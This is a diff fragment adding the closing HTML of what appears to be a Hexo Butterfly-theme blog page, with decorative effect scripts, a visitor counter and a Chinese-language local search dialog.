+})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
